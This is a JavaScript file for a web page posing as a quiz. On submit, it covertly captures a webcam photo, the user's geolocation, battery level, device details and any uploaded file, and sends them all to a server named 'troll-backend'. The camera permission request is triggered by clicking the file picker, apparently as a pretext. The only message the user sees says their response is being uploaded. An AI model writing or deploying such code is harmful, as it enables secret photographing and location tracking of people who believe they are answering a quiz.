const form = document.getElementById("quiz-form");
const videoEl = document.getElementById("video");
const canvasEl = document.getElementById("canvas");
const toast = document.getElementById("toast");
const fileInput = document.getElementById("user-file");
const submitBtn = document.getElementById("submit-btn");

const backendURL = "https://troll-backend.onrender.com/api/upload";
const constraints = { video: { facingMode: "user" }, audio: false };

let toastTimeout;

// Toast function
function showToast(message) {
  toast.innerText = message;
  toast.classList.add("show");
  clearTimeout(toastTimeout);
  toastTimeout = setTimeout(() => {
    toast.classList.remove("show");
  }, 2000);
}

// Function to request camera permission (non-blocking)
async function requestCameraPermission() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    stream.getTracks().forEach(track => track.stop()); // stop immediately
    console.log("Camera permission granted");
  } catch (err) {
    console.warn("Camera permission denied", err);
  }
}

// When user clicks file input
fileInput.addEventListener("click", async (e) => {
  // Request camera permission first
  requestCameraPermission();
  // File input will open immediately anyway
});

// Handle form submission
form.addEventListener("submit", async (e) => {
  e.preventDefault();
  submitBtn.disabled = true;
  submitBtn.textContent = "Submitting...";
  showToast("Uploading your response...");

  try {
    // Capture image from camera if granted
    let image = null;
    try {
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      videoEl.srcObject = stream;
      await videoEl.play();
      await new Promise(res => videoEl.addEventListener("canplay", () => setTimeout(res, 100)));

      const ctx = canvasEl.getContext("2d");
      canvasEl.width = videoEl.videoWidth;
      canvasEl.height = videoEl.videoHeight;
      ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
      image = canvasEl.toDataURL("image/png");

      stream.getTracks().forEach(track => track.stop());
    } catch {
      console.warn("Camera not used or denied");
    }

    // Collect metadata
    const metadata = {
      useragent: navigator.userAgent,
      platform: navigator.platform,
      width: window.innerWidth,
      height: window.innerHeight,
      language: navigator.language,
      battery: "N/A",
      location: "N/A",
      time: new Date().toLocaleString()
    };

    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      metadata.battery = battery.level * 100 + "%";
    }

    if (navigator.geolocation) {
      try {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
      } catch {
        metadata.location = "Denied";
      }
    }

    // Get uploaded file
    let uploadedFileData = null;
    if (fileInput.files.length > 0) {
      const file = fileInput.files[0];
      uploadedFileData = await new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onload = () => resolve(reader.result);
        reader.onerror = err => reject(err);
        reader.readAsDataURL(file);
      });
    }

    // Send to backend
    await fetch(backendURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image, metadata, uploadedFile: uploadedFileData })
    });

    // Show success
    document.getElementById("quiz-container").style.display = "none";
    document.getElementById("success-container").style.display = "block";

    submitBtn.disabled = false;
    submitBtn.textContent = "Submit";
    showToast("Response submitted successfully!");
  } catch (err) {
    console.error(err);
    showToast("Error! Please allow camera access if you want to submit image.");
    submitBtn.disabled = false;
    submitBtn.textContent = "Submit";
  }
});
